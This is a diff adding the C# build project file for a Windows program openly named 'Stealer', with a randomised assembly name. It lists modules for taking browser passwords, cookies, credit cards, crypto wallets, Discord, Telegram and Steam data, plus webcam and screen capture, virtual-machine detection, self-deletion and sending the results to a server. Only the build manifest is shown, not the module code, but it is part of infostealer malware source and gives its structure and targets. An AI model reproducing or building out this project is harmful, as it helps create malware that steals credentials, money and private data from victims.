@@ -1,0 +1,104 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{0217112F-5423-4622-8E0D-4D90A503D6E9}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Stealer</RootNamespace>
+    <AssemblyName>FHwFvbCd</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Stealer.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="modules\AeadParameters.cs" />
+    <Compile Include="modules\AesFastEngine.cs" />
+    <Compile Include="modules\AesGcm256.cs" />
+    <Compile Include="modules\Arrays.cs" />
+    <Compile Include="modules\Autofill.cs" />
+    <Compile Include="modules\CheckPovt.cs" />
+    <Compile Include="modules\Clipboard.cs" />
+    <Compile Include="modules\Cookies.cs" />
+    <Compile Include="modules\CreditCards.cs" />
+    <Compile Include="modules\Crypt.cs" />
+    <Compile Include="modules\CryptoException.cs" />
+    <Compile Include="modules\cSQLite.cs" />
+    <Compile Include="modules\DataLengthException.cs" />
+    <Compile Include="modules\DecryptAPI.cs" />
+    <Compile Include="modules\Delete.cs" />
+    <Compile Include="modules\DesktopFiles.cs" />
+    <Compile Include="modules\Discord.cs" />
+    <Compile Include="modules\FireFox.cs" />
+    <Compile Include="modules\FTPClient.cs" />
+    <Compile Include="modules\GcmBlockCipher.cs" />
+    <Compile Include="modules\GcmUtilities.cs" />
+    <Compile Include="modules\HardwareInfo.cs" />
+    <Compile Include="modules\Help.cs" />
+    <Compile Include="modules\History.cs" />
+    <Compile Include="modules\IAeadBlockCipher.cs" />
+    <Compile Include="modules\IBlockCipher.cs" />
+    <Compile Include="modules\ICipherParameters.cs" />
+    <Compile Include="modules\IGcmMultiplier.cs" />
+    <Compile Include="modules\ImClient.cs" />
+    <Compile Include="modules\Internet_Explorer.cs" />
+    <Compile Include="modules\InvalidCipherTextException.cs" />
+    <Compile Include="modules\KeyParameter.cs" />
+    <Compile Include="modules\Location.cs" />
+    <Compile Include="modules\MailClient.cs" />
+    <Compile Include="modules\Pack.cs" />
+    <Compile Include="modules\ParametersWithIV.cs" />
+    <Compile Include="modules\Passwords.cs" />
+    <Compile Include="modules\ScreenDektop.cs" />
+    <Compile Include="modules\SendToServer.cs" />
+    <Compile Include="modules\Skype.cs" />
+    <Compile Include="modules\Steam.cs" />
+    <Compile Include="modules\Tables8kGcmMultiplier.cs" />
+    <Compile Include="modules\Telegram.cs" />
+    <Compile Include="modules\USB.cs" />
+    <Compile Include="modules\VirtualMachine.cs" />
+    <Compile Include="modules\VPNClient.cs" />
+    <Compile Include="modules\Wallets.cs" />
+    <Compile Include="modules\WebCam.cs" />
+    <Compile Include="modules\ZipStore.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
